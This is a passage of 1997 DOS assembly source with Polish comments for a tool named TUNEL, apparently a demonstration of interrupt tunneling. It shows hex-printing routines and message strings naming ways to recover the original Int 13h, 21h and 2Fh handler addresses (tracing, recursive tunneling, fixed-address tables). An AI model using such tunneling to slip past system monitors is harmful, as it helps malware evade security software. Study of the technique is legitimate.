\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;  - przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  es                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LookUpTable2F endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ShowAddr proc near                      ; wyswietl adres w postaci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; seg:ofs heksalnie na podstawie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; zawartosci zmiennych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ShowSeg i ShowOfs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ; \\ zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  si,ShowError            ; \\ wez adres komunikatu o ewentualnym}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; / bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,ShowSeg              ; czy seg i ofs sa wyzerowane,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or   ax,ShowOfs              ; tzn czy nie znaleziono adresu ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jz   ShowAddrError           ; tak=nie znaleziono adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,ShowSeg              ; \\ wyswietl segment}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintHexDW              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  al,':'                  ; \\ wyswietl dwukropek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintChar               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,ShowOfs              ; \\ wyswietl ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintHexDW              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeCRLF               ; \\  wyswietl CR,LF,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ShowAddrError:                          ;  - czyli przejdz do nastepnego wiersza}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /  lub komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ; / przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ShowAddr endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintHexDW proc near                    ; procedura wyswietla heksalnie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; liczbe zawarta w AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ; \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  bx,HexChars             ; bx wskazuje na tablice konwersji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; liczb heksadecymalnych 0..F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintHex                ; wyswietl liczbe w AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ; \\ przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintHexDW endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintHex   proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ; zachowaj mlodsza czesc adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov al,ah                    ; AL=starsza czesc adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintHexDB              ; wyswietl starsza czesc adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop ax                       ; przywroc mlodsza czesc adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintHexDB:                             ; wyswietl czesc adresu z al}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,al                   ; zachowaj na chwile te czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            shr  al,1                    ; \\   wyswietl starsza czesc bajtu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            shr  al,1                    ;  \\  al przesuniete o 4 w prawo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            shr  al,1                    ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            shr  al,1                    ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xlat byte ptr cs:[bx]        ;  /  al=[bx+al]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintChar               ; /   wyswietl znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  al,ah                   ; \\   wyswietl mlodsza czesc bajtu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            and  al,15                   ;  \\  al zamaskowane z 00001111b}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xlat byte ptr cs:[bx]        ;  / al=[bx+al]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintChar               ; /  wyswietl znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintHex endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Print proc near                         ; procedura wyswietla tekst ASCIIZ}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; spod adresu CS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ; \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetNextChar:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lods byte ptr cs:[si]        ; wez kolejny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or   al,al                     ; czy znak jest zerem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jz   PrintExit                 ; tak=koniec napisu; wyjdz z petli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintChar               ; nie=wyswietl znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jmp short GetNextChar        ; i wez nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintExit:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; \\ przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Print endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintChar proc near                     ; procedura wyswietla znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,0Eh                  ; funkcja BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  10h                     ; wyswietl znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintChar endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeCopyRight:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch             db CR,LF,'TUNEL v1.0, Autor : Adam Blaszczyk 1997',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeGet13     db CR,LF,'Adres oryginalnej procedury 13h : '}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch             db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeGet21     db CR,LF,'Adres oryginalnej procedury 21h : '}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch             db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeGet2F     db CR,LF,'Adres oryginalnej procedury 2Fh : '}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeCRLF      db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeTrik2F13         db '      _ trik Int 2Fh/13h               := ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeTracing13        db '      _ tracing 13h                    := ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeLookUpTable21    db '      _ tablica stalych adresow 21h    := ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeRecursive21      db '      _ tuneling rekursywny 21h        := ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeTracing21        db '      _ tracing 21h                    := ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeLookUpTable2F    db '      _ tablica stalych adresow 2Fh    := ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeLookUpTableFailBadOfs db 'Blad : Zla kombinacja kodu',CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeLookUpTableFailDOSVer db 'Blad : Wersja DOS musi byc >5.0',CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeTracingFail           db 'Blad : Tracing nie dziala',CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeRecursive21Fail       db 'Blad : Tuneling rekursywny nie dziala',CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HexChars    db '0123456789ABCDEF'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ShowSeg   dw ?                      ; zmienne pomocnicze do zachowywania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ShowOfs   dw ?                      ; znalezionego adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ShowError dw ?                      ; zmienna dla ewentualnych bledow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           of1 dw ?                      ; zmienne potrzebne do zachowywania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch           se1 dw ?                      ; adresu Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IntAsFarCall  label dword               ; adres dalekiej procedury sluzacej do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    CallFarOfs dw ?                      ; emulacji instrukcji INT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    CallFarSeg dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
